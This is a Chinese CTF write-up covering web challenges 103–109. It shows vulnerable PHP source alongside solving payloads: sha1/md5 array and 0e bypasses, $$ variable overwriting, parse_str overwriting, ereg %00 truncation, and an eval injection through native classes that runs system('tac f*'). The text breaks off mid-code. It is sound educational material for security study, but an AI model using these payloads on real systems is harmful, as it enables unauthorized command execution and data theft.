<h3 id="substr"><a href="#substr" class="headerlink" title="substr()"></a>substr()</h3><p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.substr.php">substr函数详解</a></p>
<p>substr() 可以截取字符串</p>
<p>语法</p>
<pre><code>string substr( $str, start, length);
 $str ：被截取的字符串。
 start ：开始截取的位置。
 length ：截取的长度。
</code></pre>
<p>返回值</p>
<p>截取成功，就返回截取的字符串<br>start 超过字符串长度，就返回 false<br>start 和 length 设置成不合理的截取范围，就返回空字符串<br>substr((xxx),1,1):表示从第1个字母开始，显示1个字母，从1开始计数</p>
<hr>
<h3 id="hex2bin"><a href="#hex2bin" class="headerlink" title="hex2bin()"></a>hex2bin()</h3><p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.hex2bin.php">hex2bin函数详解</a></p>
<p><code>hex2bin()</code>：将十六进制字符转化为ASCII码字符。</p>
<hr>
<h3 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/hithub/p/16299548.html">CTF之php伪协议以及能使用php伪协议的函数</a></p>
<h2 id="web-103（同上题）"><a href="#web-103（同上题）" class="headerlink" title="web-103（同上题）"></a>web-103（同上题）</h2><p>相比上一题只是检测了webshell中有没有php字符串</p>
<p>做法和上题一模一样</p>
<hr>
<h2 id="web-104（sha1数组绕过）"><a href="#web-104（sha1数组绕过）" class="headerlink" title="web-104（sha1数组绕过）"></a>web-104（sha1数组绕过）</h2><p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$v1</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;v1&#x27;</span>];<br>    <span class="hljs-variable">$v2</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$v1</span>)==<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$v2</span>))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>解题思路：</p>
<p><strong>sha1跟md5类似，都无法处理数组，且存在&#x3D;&#x3D;弱比较，所以可以用数组绕过</strong></p>
<p><strong>0e绕过，当sha1处理字符串后如果出现0exxx这种数据，在弱类型比较中都会等于0所以能相等</strong></p>
<p><strong>但是这题只要填两个相同字符串就能过，有点逆天</strong></p>
<p>payload：</p>
<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">POST</span>：<span class="hljs-built_in">v1</span>[]<span class="hljs-number">=0</span>  <br>?<span class="hljs-built_in">v2</span>[]<span class="hljs-number">=1</span>   <br><br><span class="hljs-symbol">POST</span>：<span class="hljs-built_in">v1</span><span class="hljs-symbol">=aaK1STfY</span>   <span class="hljs-comment">//0e76658526655756207688271159624026011393</span><br>?<span class="hljs-built_in">v2</span><span class="hljs-symbol">=aaO8zKZF</span>   <span class="hljs-comment">//0e89257456677279068558073954252716165668</span><br><br>逆天<br><span class="hljs-symbol">POST:</span> <span class="hljs-built_in">v1</span><span class="hljs-number">=1</span><br>?<span class="hljs-built_in">v2</span><span class="hljs-number">=1</span><br></code></pre></td></tr></table></figure>

<hr>
<h3 id="sha1"><a href="#sha1" class="headerlink" title="sha1()"></a>sha1()</h3><p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.sha1.php">sha1详解</a></p>
<p>sha1 — 计算字符串的 sha1 散列</p>
<p><strong>sha1</strong>(string <code>$string</code>, bool <code>$binary</code> &#x3D; <strong><code>false</code></strong>): </p>
<p>以字符串形式返回 sha1 散列值。</p>
<p>绕过方法：不能处理数组，而且能构造出0exxxx类型数据，能绕过弱类型比较</p>
<hr>
<h2 id="web-105（变量覆盖、die）"><a href="#web-105（变量覆盖、die）" class="headerlink" title="web-105（变量覆盖、die）"></a>web-105（变量覆盖、die）</h2><p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$error</span>=<span class="hljs-string">&#x27;你还想要flag嘛？&#x27;</span>;<br><span class="hljs-variable">$suces</span>=<span class="hljs-string">&#x27;既然你想要那给你吧！&#x27;</span>;<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>)&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$key</span>===<span class="hljs-string">&#x27;error&#x27;</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;what are you doing?!&quot;</span>);	<span class="hljs-comment">//键名不能是error</span><br>    &#125;<br>    <span class="hljs-variable">$$key</span>=<span class="hljs-variable">$$value</span>;			<span class="hljs-comment">//变量覆盖，意思就是$key的内容作为变量，例如：$key=xx，$$key=$xx</span><br>    							就是把你传入的值给弄成变量<br>&#125;<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_POST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>)&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$value</span>===<span class="hljs-string">&#x27;flag&#x27;</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;what are you doing?!&quot;</span>);	<span class="hljs-comment">//键值不能是flag</span><br>    &#125;<br>    <span class="hljs-variable">$$key</span>=<span class="hljs-variable">$$value</span>;			<span class="hljs-comment">//变量覆盖</span><br>&#125;<br><span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]==<span class="hljs-variable">$flag</span>))&#123;		<span class="hljs-comment">//不相等就die($error)</span><br>    <span class="hljs-keyword">die</span>(<span class="hljs-variable">$error</span>);<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;your are good&quot;</span>.<span class="hljs-variable">$flag</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">die</span>(<span class="hljs-variable">$suces</span>);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>解题思路：</p>
<p>有两个地方有变量覆盖，有两个die函数输出，最后一个die函数要用的话，必须设置flag，但是设置flag后就只有进行变量覆盖了，所以只能用第一个die函数里的error，需要考虑怎么通过变量覆盖使变量error和变量flag相等，还需要借助变量suces</p>
<figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs swift">当<span class="hljs-keyword">get</span> 方式传入suces<span class="hljs-operator">=</span>flag,<span class="hljs-variable">$key</span><span class="hljs-operator">=</span>suces，<span class="hljs-variable">$value</span><span class="hljs-operator">=</span>flag <br>foreach(<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> <span class="hljs-operator">=&gt;</span> <span class="hljs-variable">$value</span>)&#123;<br>    $<span class="hljs-variable">$key</span><span class="hljs-operator">=</span>$<span class="hljs-variable">$value</span>;    #变成了<span class="hljs-variable">$suces</span><span class="hljs-operator">=</span><span class="hljs-variable">$flag</span>,<span class="hljs-variable">$suces的值是flag的值</span><br> &#125;<br>当post传入error<span class="hljs-operator">=</span>suces,<span class="hljs-variable">$key</span><span class="hljs-operator">=</span>error,<span class="hljs-variable">$value</span><span class="hljs-operator">=</span>suces<br>foreach(<span class="hljs-variable">$_POST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> <span class="hljs-operator">=&gt;</span> <span class="hljs-variable">$value</span>)&#123;<br>    $<span class="hljs-variable">$key</span><span class="hljs-operator">=</span>$<span class="hljs-variable">$value</span>;  #变成了<span class="hljs-variable">$error</span><span class="hljs-operator">=</span><span class="hljs-variable">$flag</span>,<span class="hljs-variable">$error的值是flag的值</span><br>&#125;<br></code></pre></td></tr></table></figure>

<p>payload：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs routeros">触发die(<span class="hljs-variable">$error</span>)来输出flag<br>?<span class="hljs-attribute">suces</span>=flag<br>post：<span class="hljs-attribute">error</span>=suces<br><br>?<span class="hljs-attribute">suces</span>=flag&amp;flag=1	注意，`$&lt;常量&gt;=<span class="hljs-literal">null</span>`<br>post：flag=<br><br>或者也可以使用下面的echo来输出flag<br>?<span class="hljs-attribute">suces</span>=flag<br>post：<span class="hljs-attribute">error</span>=suces&amp;flag=<br>这里<span class="hljs-variable">$flag</span>在第二次循环时会被覆盖为空，从而脱离最后一个<span class="hljs-keyword">if</span>判断，最后触发echo<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h3><p>变量覆盖是把变量的值当作另一个变量的名</p>
<p>例如：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;b&#x27;</span>;<br><span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;c&#x27;</span>;<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;$a&#x27;</span>;		<span class="hljs-comment">#b</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;$b&#x27;</span>;		<span class="hljs-comment">#c</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;$$a&#x27;</span> 		<span class="hljs-comment">#c</span><br></code></pre></td></tr></table></figure>

<hr>
<h3 id="die"><a href="#die" class="headerlink" title="die()"></a>die()</h3><p>PHP 中的 die() 函数是一个终止脚本执行的函数，它会立即结束当前正在运行的脚本，并可选地输出一条错误信息（可以输出变量）</p>
<p><strong>用法</strong></p>
<p>die() 函数的语法如下：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">die</span><span class="hljs-params">(message)</span></span><br></code></pre></td></tr></table></figure>

<p>参数 message 是一个可选的字符串，将作为错误信息在脚本终止前显示。如果没有提供错误信息，则不会显示任何内容。</p>
<hr>
<h2 id="web-106（sha1数组绕过）"><a href="#web-106（sha1数组绕过）" class="headerlink" title="web-106（sha1数组绕过）"></a>web-106（sha1数组绕过）</h2><p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$v1</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;v1&#x27;</span>];<br>    <span class="hljs-variable">$v2</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$v1</span>)==<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$v2</span>) &amp;&amp; <span class="hljs-variable">$v1</span>!=<span class="hljs-variable">$v2</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>解题思路：</p>
<p>我怀疑104出错了，这题才是对的，解题思路就不重写了，就在104，比104多了个$v1!&#x3D;$v2</p>
<p>payload：</p>
<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">POST</span>：<span class="hljs-built_in">v1</span>[]<span class="hljs-number">=0</span>  <br>?<span class="hljs-built_in">v2</span>[]<span class="hljs-number">=1</span>   <br><br><span class="hljs-symbol">POST</span>：<span class="hljs-built_in">v1</span><span class="hljs-symbol">=aaK1STfY</span>   <span class="hljs-comment">//0e76658526655756207688271159624026011393</span><br>?<span class="hljs-built_in">v2</span><span class="hljs-symbol">=aaO8zKZF</span>   <span class="hljs-comment">//0e89257456677279068558073954252716165668</span><br></code></pre></td></tr></table></figure>

<h2 id="web-107（parse-str-变量覆盖）"><a href="#web-107（parse-str-变量覆盖）" class="headerlink" title="web-107（parse_str()变量覆盖）"></a>web-107（parse_str()变量覆盖）</h2><p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;v1&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$v1</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;v1&#x27;</span>];<br>    <span class="hljs-variable">$v3</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v3&#x27;</span>];<br>       <span class="hljs-title function_ invoke__">parse_str</span>(<span class="hljs-variable">$v1</span>,<span class="hljs-variable">$v2</span>);<br>       <span class="hljs-keyword">if</span>(<span class="hljs-variable">$v2</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]==<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$v3</span>))&#123;<br>           <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>       &#125;<br><br>&#125;<br><br><br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>解题思路：</p>
<p>parse_str会将$v1的值赋给$v2</p>
<p>md5弱比较。<br> 数组绕过，md5不处理数组，返回null，v1不输入业返回null</p>
<p>payload：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs routeros">md5处理数组为<span class="hljs-literal">null</span>，然后parse_str(<span class="hljs-string">&#x27;flag=&#x27;</span>,<span class="hljs-variable">$v2</span>)，<span class="hljs-variable">$v2</span>=<span class="hljs-literal">null</span><br>?v3[]=1<br>post：<span class="hljs-attribute">v1</span>=flag=<br><br>或者<br>因为这里parse_str会将<span class="hljs-variable">$v1</span>的值赋给<span class="hljs-variable">$v2</span><br>所以让v2数组中flag的值等于变量v3的md5值就行了<br>让<span class="hljs-attribute">v1</span>=flag=e80118aff3ed3bc6f99038f65bef881b就可以让 [flag] =&gt; e80118aff3ed3bc6f99038f65bef881b存入到v2数组中<br><br>?<span class="hljs-attribute">v3</span>=harker<br>post:<span class="hljs-attribute">v1</span>=flag=e80118aff3ed3bc6f99038f65bef881b<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="parse-str"><a href="#parse-str" class="headerlink" title="parse_str()"></a>parse_str()</h3><p><a target="_blank" rel="noopener" href="https://www.runoob.com/php/func-string-parse-str.html">parse_str函数详解</a></p>
<p>parse_str() 函数把查询字符串解析到变量中。</p>
<p><strong>注释：</strong>如果未设置 array 参数，由该函数设置的变量将覆盖已存在的同名变量。</p>
<p><strong>注释：</strong>php.ini 文件中的 magic_quotes_gpc 设置影响该函数的输出。如果已启用，那么在 parse_str() 解析之前，变量会被 addslashes() 转换。</p>
<p>语法：</p>
<p>parse_str(<em>string,array</em>)</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><em>string</em></td>
<td>必需。规定要解析的字符串。</td>
</tr>
<tr>
<td><em>array</em></td>
<td>可选。规定存储变量的数组名称。该参数指示变量存储到数组中。</td>
</tr>
</tbody></table>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">parse_str</span>(<span class="hljs-string">&quot;name=Peter&amp;age=43&quot;</span>,<span class="hljs-variable">$myArray</span>);<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$myArray</span>);<br><span class="hljs-meta">?&gt;</span><br><br><br><span class="hljs-title function_ invoke__">Array</span> ( [name] =&gt; Peter [age] =&gt; <span class="hljs-number">43</span> ) <br><br>如果<span class="hljs-keyword">string</span>参数填xxx=后面没有值<br>则<span class="hljs-variable">$myArray</span>[<span class="hljs-string">&#x27;xxx&#x27;</span>]=<span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure>

<hr>
<h2 id="web-108（ereg-、-00截断）"><a href="#web-108（ereg-、-00截断）" class="headerlink" title="web-108（ereg()、%00截断）"></a>web-108（ereg()、%00截断）</h2><p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ereg</span> (<span class="hljs-string">&quot;^[a-zA-Z]+$&quot;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>])===<span class="hljs-literal">FALSE</span>)  &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error&#x27;</span>);<br><br>&#125;<br><span class="hljs-comment">//只有36d的人才能看到flag</span><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))==<span class="hljs-number">0x36d</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>解题思路：</p>
<p><strong>ereg()正则匹配函数，类似preg_match，php7.0已删除。ereg()存在%00截断漏洞，也就是说在字符串中遇到%00，php解析器会认为字符串结束了。而且截断之后，%00后面的值会重新赋值给原来的变量。</strong><br><strong>strrev()反转字符串。</strong><br><strong>&#x3D;&#x3D;弱类型比较支持不同的进制进行比较，就比如16&#x3D;&#x3D;0x10，这是true。</strong></p>
<p>payload：</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs llvm">构造payload让前面的字母被ereg正则匹配（因为正则要求传值中有至少一个字母），然后使用<span class="hljs-variable">%00</span>截断，然后<span class="hljs-variable">%00</span>后面的值会赋值给原来的变量<br>然后会用strrev()反转字符串并且intval处理之后跟<span class="hljs-number">0x36d</span>进行弱类型比较，所以我们只要传<span class="hljs-number">0x36d</span>的十进制数<span class="hljs-number">877</span>，反转之后就是<span class="hljs-number">778</span><br><br>?<span class="hljs-keyword">c</span><span class="hljs-operator">=</span>a<span class="hljs-variable">%00778</span><br></code></pre></td></tr></table></figure>

<hr>
<h3 id="ereg"><a href="#ereg" class="headerlink" title="ereg()"></a>ereg()</h3><p><code>ereg()</code>正则匹配函数，类似<code>preg_match</code>，php7.0已删除。<code>ereg()</code>存在%00截断漏洞，也就是说在字符串中遇到%00，php解析器会认为字符串结束了。<strong>而且截断之后，%00后面的值会重新赋值给原来的变量。</strong></p>
<hr>
<h3 id="strrev"><a href="#strrev" class="headerlink" title="strrev()"></a>strrev()</h3><p>strrev() ：反转字符串</p>
<hr>
<h2 id="web-109（-toString-方法、原生类利用，异常类和反射类）"><a href="#web-109（-toString-方法、原生类利用，异常类和反射类）" class="headerlink" title="web-109（__toString()方法、原生类利用，异常类和反射类）"></a>web-109（__toString()方法、原生类利用，异常类和反射类）</h2><p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$v1</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v1&#x27;</span>];<br>    <span class="hljs-variable">$v2</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>];<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[a-zA-Z]+/&#x27;</span>, <span class="hljs-variable">$v1</span>) &amp;&amp; <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[a-zA-Z]+/&#x27;</span>, <span class="hljs-variable">$v2</span>))&#123;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;echo new <span class="hljs-subst">$v1</span>(<span class="hljs-subst">$v2</span>());&quot;</span>);<br>    &#125;<br><br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>解题思路：</p>
<p>原生类利用，异常类和反射类<br> 类可以输出，就是当类被当作字符串执行，会调用__toString魔术方法，这个类要有这个魔术方法,并且要有返回值才可以输出，这个值要可控</p>
<p><strong>Exception 处理用于在指定的错误发生时改变脚本的正常流程，是php内置的异常处理类</strong><br><strong>通过异常处理类Exception(system(‘cmd’))可以运行指定代码，并且能返回运行的结果</strong><br><strong>ReflectionClass 或者 ReflectionMethod 都为常用的反射类，可以理解为一个类的映射</strong></p>
<p>payload：</p>
<figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs sas">?v1=Exception<span class="hljs-variable">&amp;v2</span>=<span class="hljs-meta">system</span>(<span class="hljs-string">&quot;tac f*&quot;</span>)<br><br>?v1=ReflectionClass<span class="hljs-variable">&amp;v2</span>=<span class="hljs-meta">system</span>(<span class="hljs-string">&quot;tac f*&quot;</span>)<br><br>?v1=ReflectionMethod<span class="hljs-variable">&amp;v2</span>=<span class="hljs-meta">system</span>(<span class="hljs-string">&#x27;tac f*&#x27;</span>)<br><br>使用DateTime<br>v1=DateTime<span class="hljs-variable">&amp;v2</span>=<span class="hljs-meta">system</span>(<span class="hljs-string">&#x27;tac f*&#x27;</span>)<br><br><br>echo new Exceptio<span class="hljs-meta">n</span>(<span class="hljs-meta">system</span>(<span class="hljs-string">&#x27;tac f*&#x27;</span>)())<br>会先执行命令<span class="hljs-meta">system</span>(<span class="hljs-string">&#x27;tac f*&#x27;</span>)，然后会执行完函数把函数的结果在通过异常进行抛出<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="PHP原生类"><a href="#PHP原生类" class="headerlink" title="PHP原生类"></a>PHP原生类</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/unexpectedthing/article/details/121780909">php原生类总结</a></p>
<hr>
<h3 id="toString-方法"><a href="#toString-方法" class="headerlink" title="__toString()方法"></a>__toString()方法</h3><p>将一个对象作为字符串使用时（<code>echo &lt;一个对象&gt;</code>），php会自动调用该对象的 <code>__toString()</code>方法来获取<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%A1%A8%E7%A4%BA&spm=1001.2101.3001.7020">字符串表示</a>。注意，<code>__toString()</code>方法在对象被隐式转换为字符串时（<code>echo &lt;一个对象&gt;</code>）才会触发，如果直接调用该方法，不会有任何效果。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyClass</span></span>&#123;<br>	<span class="hljs-keyword">private</span> <span class="hljs-variable">$name</span>;<br>	<br>	<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span 